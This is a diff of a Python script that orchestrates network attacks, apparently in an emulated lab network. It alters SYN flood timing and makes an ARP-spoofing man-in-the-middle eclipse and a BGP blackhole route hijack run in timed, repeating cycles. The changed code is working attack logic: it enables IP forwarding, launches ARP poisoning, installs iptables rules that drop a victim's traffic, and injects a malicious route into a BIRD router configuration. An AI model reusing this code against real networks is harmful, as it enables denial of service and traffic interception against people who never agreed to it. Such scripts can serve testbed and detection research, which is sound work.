@@ -52,7 +52,7 @@ SYNFLOOD_TARGETS = [
 ]
 
 SYNFLOOD_FLOOD_DURATION  = 0.1   # seconds each flood runs
-SYNFLOOD_BREAK_DURATION  = 240    # seconds of silence between floods
+SYNFLOOD_BREAK_DURATION  = 120   # seconds of silence between floods
 
 SYNFLOOD_PATH = "/synflood"
 
@@ -71,6 +71,9 @@ ECLIPSE_IPTABLES_RULES = [
     ["iptables", "-A", "FORWARD", "-d", ECLIPSE_VICTIM_IP, "-p", "udp", "-j", "DROP"],
 ]
 
+ARP_ATTACK_DURATION = 2   # seconds ARP eclipse stays active
+ARP_BREAK_DURATION  = 120   # seconds of silence between ARP attacks
+
 # BGP eclipse: attacker router container and BIRD config
 ECLIPSE_BGP_ROUTER_CONTAINER = "as161brd-router0-10.161.0.254"
 ECLIPSE_BGP_BIRD_CONF         = "/etc/bird/bird.conf"
@@ -84,6 +87,9 @@ protocol static hijack {
     route 10.162.0.71/32 blackhole;
 }
 """
+
+BGP_ATTACK_DURATION = 1   # seconds BGP blackhole stays active
+BGP_BREAK_DURATION  = 120   # seconds of silence between BGP attacks
 
 # ──────────────────────────────────────────────────────────────────────────────
 # SHUTDOWN EVENT  (set by main()'s signal handler; every attack loop checks it)
@@ -175,53 +181,53 @@ def eclipse_arp() -> None:
         log(f"eclipse_arp: ERROR — arp_spoof script not found at {ARP_SPOOF_PATH}")
         return
 
-    # ── Step 1: enable IP forwarding so we can act as a MITM relay ──
-    log("eclipse_arp: enabling IP forwarding")
     try:
-        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
-                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        log("eclipse_arp: IP forwarding enabled")
-    except subprocess.CalledProcessError as exc:
-        log(f"eclipse_arp: WARNING — sysctl failed: {exc}")
+        while not _shutdown.is_set():
+            # ── Step 1: enable IP forwarding so we can act as a MITM relay ──
+            log("eclipse_arp: enabling IP forwarding")
+            try:
+                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
+                               check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                log("eclipse_arp: IP forwarding enabled")
+            except subprocess.CalledProcessError as exc:
+                log(f"eclipse_arp: WARNING — sysctl failed: {exc}")
 
-    # ── Step 2: launch ARP spoofing in the background ────────────────
-    log(f"eclipse_arp: starting ARP spoof "
-        f"victim={ECLIPSE_VICTIM_IP} gateway={ECLIPSE_GATEWAY_IP}")
-    arp_proc = subprocess.Popen(
-        ["python3", ARP_SPOOF_PATH],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-    # Give it a moment to resolve MACs and send the first poison packets.
-    time.sleep(3)
-    if arp_proc.poll() is not None:
-        log("eclipse_arp: ERROR — arp_spoof process exited immediately; aborting")
-        return
-    log(f"eclipse_arp: ARP spoof running (pid={arp_proc.pid})")
-
-    # ── Step 3: install iptables DROP/REJECT rules ───────────────────
-    log("eclipse_arp: installing iptables rules")
-    for rule in ECLIPSE_IPTABLES_RULES:
-        try:
-            subprocess.run(rule, check=True,
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except subprocess.CalledProcessError as exc:
-            log(f"eclipse_arp: WARNING — iptables rule failed: {exc}")
-    log("eclipse_arp: iptables DROP rules installed — victim is now eclipsed")
-
-    # ── Step 4: keep running; restart spoof if it dies ───────────────
-    try:
-        while not _shutdown.wait(timeout=10):
+            # ── Step 2: launch ARP spoofing in the background ────────────────
+            log(f"eclipse_arp: starting ARP spoof "
+                f"victim={ECLIPSE_VICTIM_IP} gateway={ECLIPSE_GATEWAY_IP}")
+            arp_proc = subprocess.Popen(
+                ["python3", ARP_SPOOF_PATH],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            # Give it a moment to resolve MACs and send the first poison packets.
+            time.sleep(3)
             if arp_proc.poll() is not None:
-                log("eclipse_arp: ARP spoof process died, restarting")
-                arp_proc = subprocess.Popen(
-                    ["python3", ARP_SPOOF_PATH],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                )
-                log(f"eclipse_arp: ARP spoof restarted (pid={arp_proc.pid})")
+                log("eclipse_arp: ERROR — arp_spoof process exited immediately; aborting")
+                return
+            log(f"eclipse_arp: ARP spoof running (pid={arp_proc.pid})")
+
+            # ── Step 3: install iptables DROP/REJECT rules ───────────────────
+            log("eclipse_arp: installing iptables rules")
+            for rule in ECLIPSE_IPTABLES_RULES:
+                try:
+                    subprocess.run(rule, check=True,
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                except subprocess.CalledProcessError as exc:
+                    log(f"eclipse_arp: WARNING — iptables rule failed: {exc}")
+            log("eclipse_arp: iptables DROP rules installed — victim is now eclipsed")
+
+            # ── Step 4: hold attack for the attack duration ───────────────────
+            _shutdown.wait(timeout=ARP_ATTACK_DURATION)
+
+            # ── Step 5: tear down and pause before next cycle ────────────────
+            _arp_cleanup(arp_proc)
+            log("eclipse_arp: attack complete — victim released")
+
+            if not _shutdown.is_set():
+                log("eclipse_arp: pausing between attacks")
+                _shutdown.wait(timeout=ARP_BREAK_DURATION)
     finally:
-        _arp_cleanup(arp_proc)
         log("eclipse_arp: shutdown complete")
 
 
@@ -231,8 +237,9 @@ def eclipse_arp() -> None:
 # via `docker exec`; requires /var/run/docker.sock to be mounted.
 # Injects a /32 blackhole route for the victim into bird.conf, reloads BIRD
 # (which sends a BGP UPDATE to the route server), and holds the route until
-# shutdown — at which point it removes the block and reconfigures BIRD to
-# send the BGP WITHDRAW, restoring normal routing.
+# the attack duration elapses — at which point it removes the block and
+# reconfigures BIRD to send the BGP WITHDRAW, restoring normal routing,
+# then pauses before repeating.
 # ──────────────────────────────────────────────────────────────────────────────
 def _bgp_docker_exec(cmd: str, check: bool = True) -> str:
     """Run a shell command inside the AS161 border router container."""
@@ -283,49 +290,52 @@ def eclipse_bgp() -> None:
             "mount it with -v /var/run/docker.sock:/var/run/docker.sock")
         return
 
-    # ── Clean up any leftover hijack block from a previous run ───────
-    if _bgp_conf_has_hijack():
-        log("eclipse_bgp: WARNING — stale hijack block found in bird.conf; removing first")
-        _bgp_remove_hijack()
-        _bgp_birdc_configure()
-        time.sleep(3)
-
-    # ── Step 1: inject the malicious blackhole route ──────────────────
-    log(f"eclipse_bgp: injecting blackhole route for {ECLIPSE_VICTIM_IP}/32 "
-        f"into {ECLIPSE_BGP_BIRD_CONF}")
     try:
-        _bgp_inject_hijack()
-    except RuntimeError as exc:
-        log(f"eclipse_bgp: ERROR — could not write to bird.conf: {exc}")
-        return
+        while not _shutdown.is_set():
+            # ── Clean up any leftover hijack block from a previous run ───────
+            if _bgp_conf_has_hijack():
+                log("eclipse_bgp: WARNING — stale hijack block found in bird.conf; removing first")
+                _bgp_remove_hijack()
+                _bgp_birdc_configure()
+                time.sleep(3)
 
-    if not _bgp_conf_has_hijack():
-        log("eclipse_bgp: ERROR — hijack block not found after write; aborting")
-        return
-    log("eclipse_bgp: blackhole route block written to bird.conf")
+            # ── Step 1: inject the malicious blackhole route ──────────────────
+            log(f"eclipse_bgp: injecting blackhole route for {ECLIPSE_VICTIM_IP}/32 "
+                f"into {ECLIPSE_BGP_BIRD_CONF}")
+            try:
+                _bgp_inject_hijack()
+            except RuntimeError as exc:
+                log(f"eclipse_bgp: ERROR — could not write to bird.conf: {exc}")
+                return
 
-    # ── Step 2: reload BIRD to propagate the BGP UPDATE ──────────────
-    log("eclipse_bgp: reloading BIRD config (sending BGP UPDATE to route server)")
-    out = _bgp_birdc_configure()
-    if "econfigured" in out.lower():
-        log("eclipse_bgp: BIRD reconfigured — BGP UPDATE sent, victim is now eclipsed")
-    else:
-        log(f"eclipse_bgp: WARNING — unexpected birdc output: {out.strip()!r}")
-
-    # ── Step 3: hold the route; re-inject if clobbered ───────────────
-    log("eclipse_bgp: holding BGP blackhole route")
-    try:
-        while not _shutdown.wait(timeout=30):
             if not _bgp_conf_has_hijack():
-                log("eclipse_bgp: WARNING — hijack block disappeared; re-injecting")
-                try:
-                    _bgp_inject_hijack()
-                    _bgp_birdc_configure()
-                    log("eclipse_bgp: blackhole route re-injected")
-                except RuntimeError as exc:
-                    log(f"eclipse_bgp: ERROR — re-injection failed: {exc}")
+                log("eclipse_bgp: ERROR — hijack block not found after write; aborting")
+                return
+            log("eclipse_bgp: blackhole route block written to bird.conf")
+
+            # ── Step 2: reload BIRD to propagate the BGP UPDATE ──────────────
+            log("eclipse_bgp: reloading BIRD config (sending BGP UPDATE to route server)")
+            out = _bgp_birdc_configure()
+            if "econfigured" in out.lower():
+                log("eclipse_bgp: BIRD reconfigured — BGP UPDATE sent, victim is now eclipsed")
+            else:
+                log(f"eclipse_bgp: WARNING — unexpected birdc output: {out.strip()!r}")
+
+            # ── Step 3: hold the route for the attack duration ───────────────
+            log(f"eclipse_bgp: holding BGP blackhole route for {BGP_ATTACK_DURATION}s")
+            _shutdown.wait(timeout=BGP_ATTACK_DURATION)
+
+            # ── Step 4: withdraw and pause before next cycle ─────────────────
+            _bgp_cleanup()
+            log("eclipse_bgp: attack complete — victim released")
+
+            if not _shutdown.is_set():
+                log("eclipse_bgp: pausing between attacks")
+                _shutdown.wait(timeout=BGP_BREAK_DURATION)
     finally:
-        _bgp_cleanup()
+        # Ensure route is always cleaned up on exit
+        if _bgp_conf_has_hijack():
+            _bgp_cleanup()
         log("eclipse_bgp: shutdown complete")
 
 
